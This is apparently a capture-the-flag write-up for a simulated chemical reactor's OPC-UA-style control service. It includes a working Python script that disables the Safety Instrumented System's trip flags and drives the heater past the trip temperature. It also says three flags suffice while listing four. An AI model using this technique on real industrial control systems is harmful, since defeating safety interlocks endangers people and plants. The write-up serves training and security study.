# OT#004 — Chemical Reactor

**Flag:** `CTF{59cbb10f52f0f0eb26f765b05b7144ed}`  
**Service:** `169.58.126.107:6003`  
**Flag format:** `CTF{...}`

## Challenge

> OT#004 — Chemical Reactor (briefing: *Reactor SIS Briefing*).

The service exposes a small "OPC-UA-style" control interface for a chemical reactor over raw TCP. A single session can browse, read, and write both the process controller and its Safety Instrumented System (SIS). The intended failure is a process-safety one rather than a memory-safety one: the SIS accepts operational writes that disable its own protection, after which the heater can drive the reactor past the trip point. The flag is a node on the SIS and only materialises while the reactor is in the dangerous state.

## Analysis

### Framing

Every request is `[1 byte opcode][4 byte little-endian length][payload]`; every response is `[opcode | 0x80][4 byte length][payload]`. The opcodes are:

| Opcode | Operation | Payload | Response payload |
|---:|---|---|---|
| `1` | Handshake | empty | `u32 session_id` |
| `2` | Browse | `u32 session, u16 ns, u32 node` | `u8 status, u16 count, entries[]` |
| `3` | Read | `u32 session, u16 ns, u32 node` | `u8 status, u8 type, value` |
| `4` | Write | `u32 session, u16 ns, u32 node, u8 type, value` | `u8 status` |

Browse entries are `u16 ns, u32 node, u16 class, u8 name_len, name`. Write types are `1` = int32, `2` = double, `3` = bool, `4` = string (`u16 length` followed by the bytes). Status codes seen in practice:

| Status | Meaning |
|---:|---|
| `0` | success |
| `1` | node does not exist |
| `3` | write blocked (read-only node) |
| `4` | invalid session |
| `5` | type mismatch |

The session is bound to the TCP connection and survives multiple requests, but issuing `op1` again replaces the previous session id.

### Address space

Browsing from the root object `Objects` (`ns=0, id=85`) returns two children:

```text
Objects (0,85)
├─ ReactorController (1,1000)
│   ├─ 1001 HeaterPower      (double)
│   ├─ 1002 Temperature      (double)
│   ├─ 1003 Pressure         (double)
│   └─ 1004 AgitatorSpeed    (int32)
└─ SafetyInstrumentedSystem (2,2000)
    ├─ 2001 TripEnable       (bool)
    ├─ 2002 TripSetpoint     (double, write-blocked)
    ├─ 2003 Tripped          (bool)
    ├─ 2004 Flag             (string)
    ├─ 2005 AlarmAck         (bool)
    ├─ 2006 ManualReset      (bool)
    ├─ 2007 Permissive       (bool)
    ├─ 2008 PretripLatch     (bool)
    ├─ 2009 WatchdogReset    (bool)
    ├─ 2010 CalibrationHold  (bool)
    ├─ 2011 DiagnosticLatch  (bool)
    └─ 2012 HighHighAck      (bool)
```

### The protection logic

`TripSetpoint` is `350.0`, and writing it is rejected with status `3`, so the threshold cannot be raised. `HeaterPower` is clamped at `100`. Under normal operation, the SIS cuts the heater once `Temperature` exceeds the setpoint and latches `Tripped`.

The weakness is that the SIS exposes its operating flags on the same writable address space as the process values. Three of them are sufficient to make the trip logic inert:

* `TripEnable = 0` — disables the trip output entirely.
* `Permissive = 0` — removes the permissive condition required for the trip to act.
* `PretripLatch = 0` — prevents the trip from latching.
* `CalibrationHold = 1` — puts the SIS in calibration mode, where the trip function is held off.

With those values written, `HeaterPower = 100` drives the temperature past 500 °C while `Tripped` remains `0`.

### The flag

`Flag` (`ns=2, id=2004`) is a string node. It returns an empty string in the normal state and only contains the flag while the reactor is held in the dangerous condition. It is dynamic: once the reactor cools or resets, the node is empty again, so the flag has to be read while the temperature is still high.

## Solution

1. Connect and perform the handshake to obtain a session id.
2. Browse the root, the controller, and the SIS to confirm the node ids.
3. Write `TripEnable=0`, `Permissive=0`, `PretripLatch=0`, `CalibrationHold=1` (all bool writes, type `3`).
4. Write `HeaterPower=100.0` (double, type `2`).
5. Poll `Flag` until it returns a non-empty string (type `4`, `u16` length prefix).

```python
import socket, struct, time

HOST, PORT = "169.58.126.107", 6003

def recvn(s, n, timeout=1.0):
    s.settimeout(timeout)
    buf = b""
    while len(buf) < n:
        try:
            d = s.recv(n - len(buf))
        except socket.timeout:
            return None
        if not d:
            return b""
        buf += d
    return buf

def call(s, op, payload):
    s.sendall(bytes([op]) + struct.pack("<I", len(payload)) + payload)
    h = recvn(s, 1)
    if not h:
        raise ConnectionError("closed")
    n = struct.unpack("<I", recvn(s, 4))[0]
    return recvn(s, n) if n else b""

def connect():
    s = socket.create_connection((HOST, PORT), timeout=5)
    sid = struct.unpack("<I", call(s, 1, b"")[:4])[0]
    return s, sid

def browse(s, sid, ns, nid):
    b = call(s, 2, struct.pack("<I", sid) + struct.pack("<HI", ns, nid))
    assert b[4] == 0, b.hex()
    cnt = struct.unpack("<H", b[5:7])[0]
    p, out = 7, []
    for _ in range(cnt):
        ens, enid, _cls = struct.unpack("<HIH", b[p:p + 8]); p += 8
        nl = b[p]; p += 1
        out.append((ens, enid, b[p:p + nl].decode())); p += nl
    return out

def read(s, sid, ns, nid):
    b = call(s, 3, struct.pack("<I", sid) + struct.pack("<HI", ns, nid))
    assert b[4] == 0, b.hex()
    return b[5], b[6:]          # type, value

def write(s, sid, ns, nid, typ, val):
    b = call(s, 4, struct.pack("<I", sid) + struct.pack("<HI", ns, nid)
             + bytes([typ]) + val)
    return b[4]                 # status

s, sid = connect()
print("[*] Objects:", browse(s, sid, 0, 85))
print("[*] Reactor:", browse(s, sid, 1, 1000))
print("[*] SIS    :", browse(s, sid, 2, 2000))

# 1) Disable the SIS protection
for nid, v in [(2001, 0), (2007, 0), (2008, 0), (2010, 1)]:
    assert write(s, sid, 2, nid, 3, bytes([v])) == 0

# 2) Drive the heater to the maximum (clamped at 100)
assert write(s, sid, 1, 1001, 2, struct.pack("<d", 100.0)) == 0

# 3) Wait for the flag
for _ in range(40):
    typ, val = read(s, sid, 2, 2004)
    if typ == 4:
        n = struct.unpack("<H", val[:2])[0]
        if n:
            print("[+] FLAG:", val[2:2 + n].decode())
            break
    time.sleep(0.5)
```

## Notes

* The flag is dynamic. Reading `Flag` after the reactor cools or resets returns an empty string, so capture it while the dangerous state is still active.
* `TripSetpoint` is read-only (status `3`), and `HeaterPower` is clamped at `100`. The exploit does not need to defeat either: it removes the logic that consumes the setpoint.
* A useful check when exploring similar services is to browse the SIS and the process controller from the same session — if both namespaces are writable through the same connection, the safety boundary is only nominal.
